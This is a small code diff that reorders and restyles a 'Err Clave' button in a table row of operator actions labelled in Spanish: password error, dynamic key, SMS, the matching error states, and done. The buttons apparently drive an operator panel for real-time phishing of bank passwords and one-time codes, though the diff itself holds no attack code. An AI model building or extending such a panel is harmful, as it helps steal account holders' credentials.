@@ -131,9 +131,9 @@ function createRow(row) {
     <td class="col-status"></td>
     <td>
       <div class="row-actions">
+        <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
         <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
         <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
-        <button type="button" class="btn btn--error" data-action="error-login">Err Clave</button>
         <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
         <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
